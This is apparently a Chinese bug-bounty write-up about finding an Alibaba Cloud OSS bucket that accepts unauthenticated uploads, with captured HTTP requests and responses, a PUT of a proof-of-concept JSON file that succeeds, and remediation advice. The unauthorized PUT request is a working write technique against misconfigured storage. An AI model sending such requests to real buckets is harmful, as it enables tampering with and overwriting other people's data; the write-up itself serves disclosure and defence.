#  一次OSS存储桶的任意数据上传挖掘   
白帽子左一  白帽子左一   2025-02-05 07:28  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
**来****Track安全社区投稿~**  
  
**赢千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
## 第一步：识别目标  
  
在随意浏览目标网站时，我遇到了一个 **403 Forbidden** 响应。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGbYlNhqforRgtQyU2d868boO6BanplLauaLwF5M2G0TPNOIbiclBcZYic2Yiak01T7hepPJ8BCEaXIw/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 第二步：技术检测  
  
我使用 **Wappalyzer** 浏览器扩展来分析目标所使用的技术。结果显示，该网站正在使用 **阿里云对象存储服务（OSS）**。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGbYlNhqforRgtQyU2d868byVeSAKWbdZLleXNc4D6jFotBnZNCDsIuEN6ibHbjRr2h6owvHokZ9zw/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 第三步：捕获请求  
  
我启动了 **Burp Suite**，捕获了请求并将其发送到 Repeater。以下是捕获的请求：  
```
GET / HTTP/1.1
Host: target.com
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```  
## 第四步：观察响应  
  
我收到以下响应：  
```
HTTP/1.1 403 Forbidden
Server: AliyunOSS
Date: Sat, 01 Feb 2025 12:33:50 GMT
Content-Type: application/xml
Content-Length: 366
Connection: keep-alive
x-oss-request-id: 679E14AEB630023931679926
x-oss-server-time: 18
x-oss-ec: 0003-00000905
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>AccessDenied</Code>
  <Message>The bucket you access does not belong to you.</Message>
  <RequestId>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGbYlNhqforRgtQyU2d868bOrv4hnR6hRnqUnkz40gVLz5xxJntWRkicOIrNLDPANN03TE3VlXk0mQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 第五步：测试 PUT 方法  
  
由于收到 **403 Forbidden** 响应，我决定测试是否允许 **PUT 请求**。我对请求进行了如下修改：  
```
PUT /poc.json HTTP/1.1
Host: target.com
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Length: 32

{"id": "hacked-by-waseem"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGbYlNhqforRgtQyU2d868bsAh7X7Vp7X6J5q4yZ0QiaQEbadgYcWoRQQIzCJtzibNuFYw1gQeajicEA/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 第六步：收到 200 OK 响应  
  
令我惊讶的是，我收到了 **200 OK** 响应，这表明我的数据已成功上传！  
```
HTTP/1.1 200 OK
Server: AliyunOSS
Date: Sat, 01 Feb 2025 12:38:20 GMT
Content-Length: 0
Connection: keep-alive
x-oss-request-id: 679E15BC51C5F932386122A0
ETag: "1650257635488786160B4C064076B0A1"
x-oss-hash-crc64ecma: 14149601074129124870
Content-MD5: FlAldjVIh4YWC0wGQHawoQ==
x-oss-server-time: 25
```  
## 第七步：验证数据访问  
  
随后，我尝试访问上传的 **poc.json** 文件，并成功检索到了存储的数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGbYlNhqforRgtQyU2d868bk8xrrpJSkNMeicHZuDSb9m2bPsYle6NUjTr9sXxffMnJKMxysEyTVPg/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 结论  
  
**阿里云对象存储服务（OSS）** 的此类错误配置允许未授权用户上传数据，可能导致严重的安全风险，例如：  
  
        未授权的数据存储  
  
        覆盖敏感文件  
  
        潜在的数据泄露  
## 建议  
  
为了防止此类漏洞，应采取以下措施：  
  
1.**限制公共访问：** 确保只有经过身份验证的用户才能上传数据。  
  
2.**正确配置 ACL（访问控制列表）：** 仅授予授权用户适当的权限。  
  
3.**监控日志：** 定期检查日志，检测未授权的 PUT 请求。  
  
4.**启用身份验证：** 对所有云存储操作强制要求身份验证。  
  
**声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学********习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。所有渗透都需获取授权！**  
  
**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk安全知识星球,我们一起进步一起学习。星球不定期会分享一些前沿漏洞，每周安全面试经验、SRC实战纪实等文章分享，微信识别二维码，即可加入。**  
  
****  
  
